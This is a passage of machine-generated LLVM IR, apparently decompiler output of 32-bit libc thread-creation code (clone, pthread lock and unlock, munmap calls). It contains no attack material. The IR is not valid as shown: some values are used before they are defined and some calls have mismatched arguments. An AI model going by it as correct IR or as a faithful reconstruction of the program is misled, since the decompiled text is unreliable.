  store i32 %v3_8056a34, i32* %v3_8056a3a, align 4
  %v0_8056a40 = load i32, i32* @esp, align 4
  %v1_8056a40 = add i32 %v0_8056a40, 8
  %v2_8056a40 = inttoptr i32 %v1_8056a40 to i32*
  %v3_8056a40 = load i32, i32* %v2_8056a40, align 4
  store i32 %v3_8056a40, i32* %eax.global-to-local, align 4
  %v0_8056a44 = load i32, i32* @esi, align 4
  %v1_8056a44 = load i32, i32* @ebx, align 4
  %v2_8056a44 = add i32 %v1_8056a44, 404
  %v3_8056a44 = inttoptr i32 %v2_8056a44 to i32*
  store i32 %v0_8056a44, i32* %v3_8056a44, align 4
  %v0_8056a4a = load i32, i32* %eax.global-to-local, align 4
  %v1_8056a4a = load i32, i32* @esi, align 4
  %v2_8056a4a = add i32 %v1_8056a4a, 400
  %v3_8056a4a = inttoptr i32 %v2_8056a4a to i32*
  store i32 %v0_8056a4a, i32* %v3_8056a4a, align 4
  %v0_8056a50 = load i32, i32* @esp, align 4
  %v1_8056a50 = add i32 %v0_8056a50, 20
  %v2_8056a50 = inttoptr i32 %v1_8056a50 to i32*
  %v3_8056a50 = load i32, i32* %v2_8056a50, align 4
  store i32 %v3_8056a50, i32* %eax.global-to-local, align 4
  %v1_8056a54 = load i32, i32* @esi, align 4
  %v2_8056a54 = add i32 %v1_8056a54, 408
  %v3_8056a54 = inttoptr i32 %v2_8056a54 to i32*
  store i32 %v3_8056a50, i32* %v3_8056a54, align 4
  %v0_8056a5a = load i32, i32* %ecx.global-to-local, align 4
  %v1_8056a5a = add i32 %v0_8056a5a, 4
  %v2_8056a5a = inttoptr i32 %v1_8056a5a to i32*
  store i32 0, i32* %v2_8056a5a, align 4
  %v0_8056a61 = load i32, i32* %edx.global-to-local, align 4
  %v1_8056a61 = add i32 %v0_8056a61, 134676800
  %v2_8056a61 = inttoptr i32 %v1_8056a61 to i32*
  store i32 0, i32* %v2_8056a61, align 4
  %v0_8056a6b = load i32, i32* @esi, align 4
  %v1_8056a6b = load i32, i32* %edx.global-to-local, align 4
  %v2_8056a6b = add i32 %v1_8056a6b, 134676808
  %v3_8056a6b = inttoptr i32 %v2_8056a6b to i32*
  store i32 %v0_8056a6b, i32* %v3_8056a6b, align 4
  %v0_8056a71 = load i32, i32* @ebp, align 4
  %v1_8056a71 = load i32, i32* %edx.global-to-local, align 4
  %v2_8056a71 = add i32 %v1_8056a71, 134676812
  %v3_8056a71 = inttoptr i32 %v2_8056a71 to i32*
  store i32 %v0_8056a71, i32* %v3_8056a71, align 4
  %v0_8056a77 = load i32, i32* @esi, align 4
  %v1_8056a77 = add i32 %v0_8056a77, 228
  %v2_8056a77 = inttoptr i32 %v1_8056a77 to i32*
  store i32 -1, i32* %v2_8056a77, align 4
  br i1 %v1_8056a38, label %dec_label_pc_8056ae9, label %dec_label_pc_8056a83

dec_label_pc_8056a83:                             ; preds = %dec_label_pc_80569d8
  %v0_8056a83 = load i32, i32* @edi, align 4
  %v1_8056a83 = inttoptr i32 %v0_8056a83 to i32*
  %v2_8056a83 = load i32, i32* %v1_8056a83, align 4
  store i32 %v2_8056a83, i32* %eax.global-to-local, align 4
  %v1_8056a85 = trunc i32 %v2_8056a83 to i8
  %v2_8056a85 = load i32, i32* @esi, align 4
  %v3_8056a85 = add i32 %v2_8056a85, 45
  %v4_8056a85 = inttoptr i32 %v3_8056a85 to i8*
  store i8 %v1_8056a85, i8* %v4_8056a85, align 1
  %v0_8056a88 = load i32, i32* @edi, align 4
  %v1_8056a88 = add i32 %v0_8056a88, 24
  %v2_8056a88 = inttoptr i32 %v1_8056a88 to i32*
  %v3_8056a88 = load i32, i32* %v2_8056a88, align 4
  store i32 %v3_8056a88, i32* %eax.global-to-local, align 4
  %v1_8056a8b = load i32, i32* @esi, align 4
  %v2_8056a8b = add i32 %v1_8056a8b, 392
  %v3_8056a8b = inttoptr i32 %v2_8056a8b to i32*
  store i32 %v3_8056a88, i32* %v3_8056a8b, align 4
  %v0_8056a91 = load i32, i32* @edi, align 4
  %v1_8056a91 = add i32 %v0_8056a91, 12
  %v2_8056a91 = inttoptr i32 %v1_8056a91 to i32*
  %v3_8056a91 = load i32, i32* %v2_8056a91, align 4
  store i32 %v3_8056a91, i32* %eax.global-to-local, align 4
  %v1_8056a94 = icmp eq i32 %v3_8056a91, 0
  br i1 %v1_8056a94, label %dec_label_pc_8056ab9, label %dec_label_pc_8056a98

dec_label_pc_8056a98:                             ; preds = %dec_label_pc_8056a83
  %v1_8056a98 = add i32 %v3_8056a91, -1
  %v8_8056a98 = icmp eq i32 %v1_8056a98, 0
  store i32 %v1_8056a98, i32* %eax.global-to-local, align 4
  %v1_8056a99 = icmp eq i1 %v8_8056a98, false
  br i1 %v1_8056a99, label %dec_label_pc_8056ae0, label %dec_label_pc_8056a9b

dec_label_pc_8056a9b:                             ; preds = %dec_label_pc_8056a98
  %v1_8056a9b = add i32 %v0_8056a91, 4
  %v2_8056a9b = inttoptr i32 %v1_8056a9b to i32*
  %v3_8056a9b = load i32, i32* %v2_8056a9b, align 4
  %v1_8056a9e = load i32, i32* @esi, align 4
  %v2_8056a9e = add i32 %v1_8056a9e, 228
  %v3_8056a9e = inttoptr i32 %v2_8056a9e to i32*
  store i32 %v3_8056a9b, i32* %v3_8056a9e, align 4
  %v0_8056aa4 = load i32, i32* @edi, align 4
  %v1_8056aa4 = add i32 %v0_8056aa4, 8
  store i32 %v1_8056aa4, i32* %eax.global-to-local, align 4
  %v0_8056aa7 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8056aa7 = load i32, i32* @esp, align 4
  %v2_8056aa7 = add i32 %v1_8056aa7, -4
  %v3_8056aa7 = inttoptr i32 %v2_8056aa7 to i32*
  store i32 %v0_8056aa7, i32* %v3_8056aa7, align 4
  %v1_8056aa8 = add i32 %v1_8056aa7, -8
  %v2_8056aa8 = inttoptr i32 %v1_8056aa8 to i32*
  store i32 4, i32* %v2_8056aa8, align 4
  %v0_8056aaa = load i32, i32* %eax.global-to-local, align 4
  %v2_8056aaa = add i32 %v1_8056aa7, -12
  %v3_8056aaa = inttoptr i32 %v2_8056aaa to i32*
  store i32 %v0_8056aaa, i32* %v3_8056aaa, align 4
  %v0_8056aab = load i32, i32* @esi, align 4
  %v1_8056aab = add i32 %v0_8056aab, 232
  store i32 %v1_8056aab, i32* %eax.global-to-local, align 4
  %v2_8056ab1 = add i32 %v1_8056aa7, -16
  %v3_8056ab1 = inttoptr i32 %v2_8056ab1 to i32*
  store i32 %v1_8056aab, i32* %v3_8056ab1, align 4
  %v2_8056ab2 = load i32, i32* %stack_var_-16, align 4
  %v5_8056ab2 = call i32 @memcpy(i16* %v4_8056b06, i32 1, i32 %v2_8056ab2)
  br label %dec_label_pc_8056add

dec_label_pc_8056ab9:                             ; preds = %dec_label_pc_8056a83
  %v0_8056ab9 = load i32, i32* @esp, align 4
  %v1_8056abc = add i32 %v0_8056ab9, 28
  %v2_8056abc = inttoptr i32 %v1_8056abc to i32*
  %v3_8056abc = load i32, i32* %v2_8056abc, align 4
  %v5_8056abc = add i32 %v0_8056ab9, -16
  %v6_8056abc = inttoptr i32 %v5_8056abc to i32*
  store i32 %v3_8056abc, i32* %v6_8056abc, align 4
  %v1_8056ac0 = call i32 @sched_getscheduler(i32 %arg1)
  %v1_8056ac5 = load i32, i32* @esi, align 4
  %v2_8056ac5 = add i32 %v1_8056ac5, 228
  %v3_8056ac5 = inttoptr i32 %v2_8056ac5 to i32*
  store i32 %v1_8056ac0, i32* %v3_8056ac5, align 4
  %v0_8056acb = load i32, i32* @esp, align 4
  %v1_8056acb = inttoptr i32 %v0_8056acb to i32*
  %v3_8056acb = add i32 %v0_8056acb, 4
  %v0_8056acc = load i32, i32* @esi, align 4
  %v1_8056acc = add i32 %v0_8056acc, 232
  store i32 %v1_8056acc, i32* %eax.global-to-local, align 4
  %v1_8056ad2 = inttoptr i32 %v3_8056acb to i32*
  %v2_8056ad2 = load i32, i32* %v1_8056ad2, align 4
  store i32 %v2_8056ad2, i32* %edx.global-to-local, align 4
  store i32 %v1_8056acc, i32* %v1_8056ad2, align 4
  %v1_8056ad4 = add i32 %v0_8056acb, 44
  %v2_8056ad4 = inttoptr i32 %v1_8056ad4 to i32*
  %v3_8056ad4 = load i32, i32* %v2_8056ad4, align 4
  store i32 %v3_8056ad4, i32* %v1_8056acb, align 4
  %v2_8056ad8 = load i32, i32* %stack_var_-16, align 4
  %v5_8056ad8 = call i32 @sched_getparam(i32 %arg1, i32 1, i32 %v2_8056ad8, i32 %v0_805672f)
  br label %dec_label_pc_8056add

dec_label_pc_8056add:                             ; preds = %dec_label_pc_8056a9b, %dec_label_pc_8056ab9
  %storemerge2 = phi i32 [ %v5_8056ad8, %dec_label_pc_8056ab9 ], [ %v5_8056ab2, %dec_label_pc_8056a9b ]
  store i32 %storemerge2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056ae0

dec_label_pc_8056ae0:                             ; preds = %dec_label_pc_8056a98, %dec_label_pc_8056add
  %v0_8056ae0 = load i32, i32* @ebx, align 4
  %v1_8056ae0 = add i32 %v0_8056ae0, 232
  %v2_8056ae0 = inttoptr i32 %v1_8056ae0 to i32*
  %v3_8056ae0 = load i32, i32* %v2_8056ae0, align 4
  store i32 %v3_8056ae0, i32* %eax.global-to-local, align 4
  %v2_8056ae6 = add i32 %v0_8056ae0, 24
  %v3_8056ae6 = inttoptr i32 %v2_8056ae6 to i32*
  store i32 %v3_8056ae0, i32* %v3_8056ae6, align 4
  br label %dec_label_pc_8056ae9

dec_label_pc_8056ae9:                             ; preds = %dec_label_pc_80569d8, %dec_label_pc_8056ae0
  %v0_8056ae9 = load i32, i32* @esp, align 4
  %v1_8056ae9 = add i32 %v0_8056ae9, 36
  %v2_8056ae9 = inttoptr i32 %v1_8056ae9 to i32*
  %v3_8056ae9 = load i32, i32* %v2_8056ae9, align 4
  %v1_8056aed = add i32 %v0_8056ae9, 68
  store i32 %v1_8056aed, i32* %eax.global-to-local, align 4
  %v1_8056af1 = load i32, i32* @ebx, align 4
  %v2_8056af1 = add i32 %v1_8056af1, 92
  %v3_8056af1 = inttoptr i32 %v2_8056af1 to i32*
  store i32 %v3_8056ae9, i32* %v3_8056af1, align 4
  %v0_8056af4 = load i32, i32* @ebx, align 4
  %v1_8056af4 = add i32 %v0_8056af4, 100
  store i32 %v1_8056af4, i32* @edx, align 4
  %v0_8056af7 = load i32, i32* @esp, align 4
  %v1_8056af7 = add i32 %v0_8056af7, 32
  %v2_8056af7 = inttoptr i32 %v1_8056af7 to i32*
  %v3_8056af7 = load i32, i32* %v2_8056af7, align 4
  store i32 %v3_8056af7, i32* %ecx.global-to-local, align 4
  %v2_8056afb = add i32 %v0_8056af4, 96
  %v3_8056afb = inttoptr i32 %v2_8056afb to i32*
  store i32 %v3_8056af7, i32* %v3_8056afb, align 4
  %v0_8056afe = load i32, i32* @ebp, align 4
  %v1_8056afe = load i32, i32* @esp, align 4
  %v2_8056afe = add i32 %v1_8056afe, -4
  %v3_8056afe = inttoptr i32 %v2_8056afe to i32*
  store i32 %v0_8056afe, i32* %v3_8056afe, align 4
  %v1_8056aff = add i32 %v1_8056afe, -8
  %v2_8056aff = inttoptr i32 %v1_8056aff to i32*
  store i32 128, i32* %v2_8056aff, align 4
  %v0_8056b04 = load i32, i32* %eax.global-to-local, align 4
  %v2_8056b04 = add i32 %v1_8056afe, -12
  %v3_8056b04 = inttoptr i32 %v2_8056b04 to i32*
  store i32 %v0_8056b04, i32* %v3_8056b04, align 4
  %v0_8056b05 = load i32, i32* @edx, align 4
  %v2_8056b05 = add i32 %v1_8056afe, -16
  %v3_8056b05 = inttoptr i32 %v2_8056b05 to i32*
  store i32 %v0_8056b05, i32* %v3_8056b05, align 4
  %v2_8056b06 = load i32, i32* %stack_var_-16, align 4
  %v5_8056b06 = call i32 @memcpy(i16* %v4_8056b06, i32 1, i32 %v2_8056b06)
  store i32 %v5_8056b06, i32* %eax.global-to-local, align 4
  %v0_8056b0b = load i32, i32* @esp, align 4
  %v1_8056b0b = inttoptr i32 %v0_8056b0b to i32*
  %v2_8056b0b = load i32, i32* %v1_8056b0b, align 4
  store i32 %v2_8056b0b, i32* @esi, align 4
  %v0_8056b0c = load i32, i32* @ebx, align 4
  %v1_8056b0c = add i32 %v0_8056b0c, 24
  %v2_8056b0c = inttoptr i32 %v1_8056b0c to i32*
  %v3_8056b0c = load i32, i32* %v2_8056b0c, align 4
  store i32 %v3_8056b0c, i32* %v1_8056b0b, align 4
  %v1_8056b0f = call i32 @__pthread_manager_adjust_prio(i32 %arg1)
  %v0_8056b14 = load i32, i32* bitcast (i32** @global_var_8074520.625 to i32*), align 32
  %v1_8056b19 = load i32, i32* @ebx, align 4
  %v2_8056b19 = add i32 %v1_8056b19, 4
  %v3_8056b19 = inttoptr i32 %v2_8056b19 to i32*
  store i32 %v0_8056b14, i32* %v3_8056b19, align 4
  %v0_8056b1f = load i32, i32* bitcast (i32** @global_var_8074520.625 to i32*), align 32
  %v1_8056b26 = load i32, i32* @ebx, align 4
  %v2_8056b26 = inttoptr i32 %v1_8056b26 to i32*
  store i32 %v0_8056b1f, i32* %v2_8056b26, align 4
  %v0_8056b28 = load i32, i32* bitcast (i32** @global_var_8074520.625 to i32*), align 32
  %v0_8056b2f = load i32, i32* @ebx, align 4
  store i32 %v0_8056b2f, i32* @global_var_8074524.624, align 4
  store i32 %v0_8056b28, i32* %eax.global-to-local, align 4
  %v2_8056b37 = inttoptr i32 %v0_8056b28 to i32*
  store i32 %v0_8056b2f, i32* %v2_8056b37, align 4
  %v0_8056b39 = load i32, i32* @esp, align 4
  %v1_8056b39 = add i32 %v0_8056b39, 24
  %v2_8056b39 = inttoptr i32 %v1_8056b39 to i32*
  %v3_8056b39 = load i32, i32* %v2_8056b39, align 4
  %v4_8056b39 = icmp eq i32 %v3_8056b39, 0
  br i1 %v4_8056b39, label %dec_label_pc_8056bac, label %dec_label_pc_8056b40

dec_label_pc_8056b40:                             ; preds = %dec_label_pc_8056ae9
  %v1_8056b40 = add i32 %v0_8056b39, 4
  %v2_8056b40 = inttoptr i32 %v1_8056b40 to i32*
  %v3_8056b40 = load i32, i32* %v2_8056b40, align 4
  store i32 %v3_8056b40, i32* %ecx.global-to-local, align 4
  %v0_8056b44 = load i32, i32* @global_var_807e57c.630, align 4
  store i32 %v0_8056b44, i32* %eax.global-to-local, align 4
  %v1_8056b49 = add i32 %v3_8056b40, 416
  %v2_8056b49 = inttoptr i32 %v1_8056b49 to i8*
  %v3_8056b49 = load i8, i8* %v2_8056b49, align 1
  %v4_8056b49 = zext i8 %v3_8056b49 to i32
  %v5_8056b49 = load i32, i32* @edx, align 4
  %v6_8056b49 = and i32 %v5_8056b49, -256
  %v7_8056b49 = or i32 %v4_8056b49, %v0_8056b44
  %v3_8056b4f = trunc i32 %v7_8056b49 to i8
  %v5_8056b4f = icmp slt i8 %v3_8056b4f, 0
  %v9_8056b4f = urem i32 %v7_8056b49, 256
  %v12_8056b4f = or i32 %v9_8056b4f, %v6_8056b49
  store i32 %v12_8056b4f, i32* %edx.global-to-local, align 4
  %v1_8056b51 = icmp eq i1 %v5_8056b4f, false
  br i1 %v1_8056b51, label %dec_label_pc_8056bac, label %dec_label_pc_8056b53

dec_label_pc_8056b53:                             ; preds = %dec_label_pc_8056b40
  store i32 0, i32* @edx, align 4
  %v0_8056b55 = load i32, i32* @ebx, align 4
  %v1_8056b55 = add i32 %v0_8056b55, 28
  %v2_8056b55 = inttoptr i32 %v1_8056b55 to i32*
  %v3_8056b55 = load i32, i32* %v2_8056b55, align 4
  store i32 %v3_8056b55, i32* @eax, align 4
  %v1_8056b58 = call i32 @__pthread_lock(i32 %arg1)
  %v0_8056b5d = load i32, i32* @global_var_807452c.636, align 4
  %v12_8056b62 = or i32 %v0_8056b5d, 3840
  store i32 %v12_8056b62, i32* %eax.global-to-local, align 4
  %v0_8056b65 = load i32, i32* @ebx, align 4
  %v1_8056b65 = load i32, i32* @esp, align 4
  %v2_8056b65 = add i32 %v1_8056b65, -4
  %v3_8056b65 = inttoptr i32 %v2_8056b65 to i32*
  store i32 %v0_8056b65, i32* %v3_8056b65, align 4
  %v0_8056b66 = load i32, i32* %eax.global-to-local, align 4
  %v2_8056b66 = add i32 %v1_8056b65, -8
  %v3_8056b66 = inttoptr i32 %v2_8056b66 to i32*
  store i32 %v0_8056b66, i32* %v3_8056b66, align 4
  %v0_8056b67 = load i32, i32* @ebx, align 4
  %v2_8056b67 = add i32 %v1_8056b65, -12
  %v3_8056b67 = inttoptr i32 %v2_8056b67 to i32*
  store i32 %v0_8056b67, i32* %v3_8056b67, align 4
  %v1_8056b68 = add i32 %v1_8056b65, -16
  %v2_8056b68 = inttoptr i32 %v1_8056b68 to i32*
  store i32 134571325, i32* %v2_8056b68, align 4
  %v2_8056b6d = load i32, i32* %stack_var_-16, align 4
  %v5_8056b6d = call i32 @clone(i32 %arg1, i32 1, i32 %v2_8056b6d, i32 %v0_805672f)
  store i32 %v5_8056b6d, i32* @eax, align 4
  %v0_8056b72 = load i32, i32* @esp, align 4
  store i32 %v5_8056b6d, i32* @esi, align 4
  %v10_8056b77 = icmp eq i32 %v5_8056b6d, -1
  br i1 %v10_8056b77, label %dec_label_pc_8056ba8, label %dec_label_pc_8056b7c

dec_label_pc_8056b7c:                             ; preds = %dec_label_pc_8056b53
  %v0_8056b7c = load i32, i32* @ebx, align 4
  %v2_8056b7c = add i32 %v0_8056b7c, 428
  %v3_8056b7c = inttoptr i32 %v2_8056b7c to i32*
  store i32 %v0_8056b7c, i32* %v3_8056b7c, align 4
  %v0_8056b82 = load i32, i32* @ebx, align 4
  %v1_8056b82 = add i32 %v0_8056b82, 424
  %v2_8056b82 = inttoptr i32 %v1_8056b82 to i32*
  store i32 8, i32* %v2_8056b82, align 4
  %v0_8056b8c = load i32, i32* @ebx, align 4
  store i32 %v0_8056b8c, i32* @global_var_807e584.631, align 4
  %v2_8056b92 = add i32 %v0_8056b8c, 20
  %v3_8056b92 = inttoptr i32 %v2_8056b92 to i32*
  store i32 %v5_8056b6d, i32* %v3_8056b92, align 4
  %v0_8056b95 = call i32 @__linuxthreads_create_event()
  store i32 %v0_8056b95, i32* %eax.global-to-local, align 4
  %v0_8056b9a = load i32, i32* @esp, align 4
  %v0_8056b9d = load i32, i32* @ebx, align 4
  %v1_8056b9d = add i32 %v0_8056b9d, 28
  %v2_8056b9d = inttoptr i32 %v1_8056b9d to i32*
  %v3_8056b9d = load i32, i32* %v2_8056b9d, align 4
  %v5_8056b9d = add i32 %v0_8056b9a, -16
  %v6_8056b9d = inttoptr i32 %v5_8056b9d to i32*
  store i32 %v3_8056b9d, i32* %v6_8056b9d, align 4
  %v2_8056ba0 = call i32 @__pthread_unlock(i32* %v1_8056cbf)
  store i32 %v2_8056ba0, i32* %eax.global-to-local, align 4
  %v0_8056ba5 = load i32, i32* @esp, align 4
  %v0_8056ba8.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8056ba8

dec_label_pc_8056ba8:                             ; preds = %dec_label_pc_8056b53, %dec_label_pc_8056b7c
  %v1_8056bb125.in = phi i32 [ %v0_8056b72, %dec_label_pc_8056b53 ], [ %v0_8056ba5, %dec_label_pc_8056b7c ]
  %v0_8056ba8 = phi i32 [ %v5_8056b6d, %dec_label_pc_8056b53 ], [ %v0_8056ba8.pre, %dec_label_pc_8056b7c ]
  %v1_8056bb125 = add i32 %v1_8056bb125.in, 16
  %v1_8056ba8 = icmp eq i32 %v0_8056ba8, 0
  %v1_8056baa = icmp eq i1 %v1_8056ba8, false
  br i1 %v1_8056baa, label %dec_label_pc_8056bc6, label %dec_label_pc_8056bac

dec_label_pc_8056bac:                             ; preds = %dec_label_pc_8056ba8, %dec_label_pc_8056b40, %dec_label_pc_8056ae9
  %v1_8056bb1 = phi i32 [ %v1_8056bb125, %dec_label_pc_8056ba8 ], [ %v0_8056b39, %dec_label_pc_8056b40 ], [ %v0_8056b39, %dec_label_pc_8056ae9 ]
  %v0_8056bac = load i32, i32* @global_var_807452c.636, align 4
  store i32 %v0_8056bac, i32* %eax.global-to-local, align 4
  %v0_8056bb1 = load i32, i32* @ebx, align 4
  %v2_8056bb1 = add i32 %v1_8056bb1, -4
  %v3_8056bb1 = inttoptr i32 %v2_8056bb1 to i32*
  store i32 %v0_8056bb1, i32* %v3_8056bb1, align 4
  %v0_8056bb2 = load i32, i32* %eax.global-to-local, align 4
  %v12_8056bb2 = or i32 %v0_8056bb2, 3840
  store i32 %v12_8056bb2, i32* %eax.global-to-local, align 4
  %v2_8056bb5 = add i32 %v1_8056bb1, -8
  %v3_8056bb5 = inttoptr i32 %v2_8056bb5 to i32*
  store i32 %v12_8056bb2, i32* %v3_8056bb5, align 4
  %v0_8056bb6 = load i32, i32* @ebx, align 4
  %v2_8056bb6 = add i32 %v1_8056bb1, -12
  %v3_8056bb6 = inttoptr i32 %v2_8056bb6 to i32*
  store i32 %v0_8056bb6, i32* %v3_8056bb6, align 4
  %v1_8056bb7 = add i32 %v1_8056bb1, -16
  %v2_8056bb7 = inttoptr i32 %v1_8056bb7 to i32*
  store i32 134571118, i32* %v2_8056bb7, align 4
  %v2_8056bbc = load i32, i32* %stack_var_-16, align 4
  %v5_8056bbc = call i32 @clone(i32 %arg1, i32 1, i32 %v2_8056bbc, i32 %v0_805672f)
  store i32 %v5_8056bbc, i32* %eax.global-to-local, align 4
  store i32 %v5_8056bbc, i32* @esi, align 4
  br label %dec_label_pc_8056bc6

dec_label_pc_8056bc6:                             ; preds = %dec_label_pc_8056ba8, %dec_label_pc_8056bac
  %v0_8056c53 = phi i32 [ %v0_8056ba8, %dec_label_pc_8056ba8 ], [ %v5_8056bbc, %dec_label_pc_8056bac ]
  %v10_8056bc6 = icmp eq i32 %v0_8056c53, -1
  %v1_8056bc9 = icmp eq i1 %v10_8056bc6, false
  %v1_8056c53 = load i32, i32* @ebx, align 4
  br i1 %v1_8056bc9, label %dec_label_pc_8056c53, label %dec_label_pc_8056bcf

dec_label_pc_8056bcf:                             ; preds = %dec_label_pc_8056bc6
  %v1_8056bcf = inttoptr i32 %v1_8056c53 to i32*
  %v2_8056bcf = load i32, i32* %v1_8056bcf, align 4
  store i32 %v2_8056bcf, i32* %eax.global-to-local, align 4
  %v1_8056bd1 = add i32 %v1_8056c53, 4
  %v2_8056bd1 = inttoptr i32 %v1_8056bd1 to i32*
  %v3_8056bd1 = load i32, i32* %v2_8056bd1, align 4
  store i32 %v3_8056bd1, i32* %edx.global-to-local, align 4
  %v0_8056bd4 = load i32, i32* @edi, align 4
  %v1_8056bd4 = icmp eq i32 %v0_8056bd4, 0
  %v2_8056bd6 = add i32 %v2_8056bcf, 4
  %v3_8056bd6 = inttoptr i32 %v2_8056bd6 to i32*
  store i32 %v3_8056bd1, i32* %v3_8056bd6, align 4
  %v0_8056bd9 = load i32, i32* @ebx, align 4
  %v1_8056bd9 = add i32 %v0_8056bd9, 4
  %v2_8056bd9 = inttoptr i32 %v1_8056bd9 to i32*
  %v3_8056bd9 = load i32, i32* %v2_8056bd9, align 4
  store i32 %v3_8056bd9, i32* @edx, align 4
  %v0_8056bdc = load i32, i32* %eax.global-to-local, align 4
  %v2_8056bdc = inttoptr i32 %v3_8056bd9 to i32*
  store i32 %v0_8056bdc, i32* %v2_8056bdc, align 4
  br i1 %v1_8056bd4, label %dec_label_pc_8056be6, label %dec_label_pc_8056be0

dec_label_pc_8056be0:                             ; preds = %dec_label_pc_8056bcf
  %v0_8056be0 = load i32, i32* @edi, align 4
  %v1_8056be0 = add i32 %v0_8056be0, 24
  %v2_8056be0 = inttoptr i32 %v1_8056be0 to i32*
  %v3_8056be0 = load i32, i32* %v2_8056be0, align 4
  %v4_8056be0 = icmp eq i32 %v3_8056be0, 0
  %v1_8056be4 = icmp eq i1 %v4_8056be0, false
  br i1 %v1_8056be4, label %dec_label_pc_8056be0.dec_label_pc_8056c1d_crit_edge, label %dec_label_pc_8056be6

dec_label_pc_8056be0.dec_label_pc_8056c1d_crit_edge: ; preds = %dec_label_pc_8056be0
  %v0_8056c1d.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8056c1d

dec_label_pc_8056be6:                             ; preds = %dec_label_pc_8056be0, %dec_label_pc_8056bcf
  %v0_8056be6 = load i32, i32* @ebx, align 4
  %v1_8056be6 = add i32 %v0_8056be6, 400
  %v2_8056be6 = inttoptr i32 %v1_8056be6 to i32*
  %v3_8056be6 = load i32, i32* %v2_8056be6, align 4
  store i32 %v3_8056be6, i32* %eax.global-to-local, align 4
  %v1_8056bec = icmp eq i32 %v3_8056be6, 0
  br i1 %v1_8056bec, label %dec_label_pc_8056be6.dec_label_pc_8056c01_crit_edge, label %dec_label_pc_8056bf0

dec_label_pc_8056be6.dec_label_pc_8056c01_crit_edge: ; preds = %dec_label_pc_8056be6
  %v1_8056c06.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8056c01

dec_label_pc_8056bf0:                             ; preds = %dec_label_pc_8056be6
  %v0_8056bf0 = load i32, i32* @ecx, align 4
  %v1_8056bf0 = load i32, i32* @esp, align 4
  %v2_8056bf0 = add i32 %v1_8056bf0, -4
  %v3_8056bf0 = inttoptr i32 %v2_8056bf0 to i32*
  store i32 %v0_8056bf0, i32* %v3_8056bf0, align 4
  %v0_8056bf1 = load i32, i32* @ecx, align 4
  %v2_8056bf1 = add i32 %v1_8056bf0, -8
  %v3_8056bf1 = inttoptr i32 %v2_8056bf1 to i32*
  store i32 %v0_8056bf1, i32* %v3_8056bf1, align 4
  %v2_8056bf2 = add i32 %v1_8056bf0, -12
  %v3_8056bf2 = inttoptr i32 %v2_8056bf2 to i32*
  store i32 %v3_8056be6, i32* %v3_8056bf2, align 4
  %v0_8056bf3 = load i32, i32* @ebx, align 4
  %v1_8056bf3 = add i32 %v0_8056bf3, 396
  %v2_8056bf3 = inttoptr i32 %v1_8056bf3 to i32*
  %v3_8056bf3 = load i32, i32* %v2_8056bf3, align 4
  %v5_8056bf3 = add i32 %v1_8056bf0, -16
  %v6_8056bf3 = inttoptr i32 %v5_8056bf3 to i32*
  store i32 %v3_8056bf3, i32* %v6_8056bf3, align 4
  %v2_8056bf9 = load i32, i32* %stack_var_-16, align 4
  %v5_8056bf9 = call i32 @munmap(i32 %arg1, i32 1, i32 %v2_8056bf9, i32 %v0_805672f)
  store i32 %v5_8056bf9, i32* %eax.global-to-local, align 4
  %v0_8056bfe = load i32, i32* @esp, align 4
  %v1_8056bfe = add i32 %v0_8056bfe, 16
  br label %dec_label_pc_8056c01

dec_label_pc_8056c01:                             ; preds = %dec_label_pc_8056be6.dec_label_pc_8056c01_crit_edge, %dec_label_pc_8056bf0
  %v1_8056c06 = phi i32 [ %v1_8056c06.pre, %dec_label_pc_8056be6.dec_label_pc_8056c01_crit_edge ], [ %v1_8056bfe, %dec_label_pc_8056bf0 ]
  %v0_8056c01 = load i32, i32* @global_var_807d134.638, align 4
  store i32 %v0_8056c01, i32* %eax.global-to-local, align 4
  %v0_8056c06 = load i32, i32* @edx, align 4
  %v2_8056c06 = add i32 %v1_8056c06, -4
  %v3_8056c06 = inttoptr i32 %v2_8056c06 to i32*
  store i32 %v0_8056c06, i32* %v3_8056c06, align 4
  %v0_8056c07 = load i32, i32* %eax.global-to-local, align 4
  %v2_8056c07 = mul i32 %v0_8056c07, 4
  store i32 %v2_8056c07, i32* %eax.global-to-local, align 4
  %v0_8056c0a = load i32, i32* @edx, align 4
  %v2_8056c0a = add i32 %v1_8056c06, -8
  %v3_8056c0a = inttoptr i32 %v2_8056c0a to i32*
  store i32 %v0_8056c0a, i32* %v3_8056c0a, align 4
  %v0_8056c0b = load i32, i32* @ebx, align 4
  %v1_8056c0b = load i32, i32* %eax.global-to-local, align 4
  %v2_8056c0b = sub i32 %v0_8056c0b, %v1_8056c0b
  store i32 %v2_8056c0b, i32* @ebx, align 4
  %v2_8056c0d = add i32 %v1_8056c06, -12
  %v3_8056c0d = inttoptr i32 %v2_8056c0d to i32*
  store i32 %v1_8056c0b, i32* %v3_8056c0d, align 4
  %v0_8056c0e = load i32, i32* @ebx, align 4
  %v1_8056c0e = add i32 %v0_8056c0e, 480
  store i32 %v1_8056c0e, i32* %eax.global-to-local, align 4
  %v2_8056c14 = add i32 %v1_8056c06, -16
  %v3_8056c14 = inttoptr i32 %v2_8056c14 to i32*
  store i32 %v1_8056c0e, i32* %v3_8056c14, align 4
  %v2_8056c15 = load i32, i32* %stack_var_-16, align 4
  %v5_8056c15 = call i32 @munmap(i32 %arg1, i32 1, i32 %v2_8056c15, i32 %v0_805672f)
  store i32 %v5_8056c15, i32* %eax.global-to-local, align 4
  %v0_8056c1a = load i32, i32* @esp, align 4
  %v1_8056c1a = add i32 %v0_8056c1a, 16
  br label %dec_label_pc_8056c1d

dec_label_pc_8056c1d:                             ; preds = %dec_label_pc_8056be0.dec_label_pc_8056c1d_crit_edge, %dec_label_pc_8056c01
  %v0_8056c1d = phi i32 [ %v0_8056c1d.pre, %dec_label_pc_8056be0.dec_label_pc_8056c1d_crit_edge ], [ %v1_8056c1a, %dec_label_pc_8056c01 ]
  %v1_8056c1d = add i32 %v0_8056c1d, 20
  %v2_8056c1d = inttoptr i32 %v1_8056c1d to i32*
  %v3_8056c1d = load i32, i32* %v2_8056c1d, align 4
  %v2_8056c21 = mul i32 %v3_8056c1d, 16
  store i32 %v2_8056c21, i32* %eax.global-to-local, align 4
  %v1_8056c24 = add i32 %v2_8056c21, 134676808
  %v2_8056c24 = inttoptr i32 %v1_8056c24 to i32*
  store i32 0, i32* %v2_8056c24, align 8
  %v0_8056c2e = load i32, i32* %eax.global-to-local, align 4
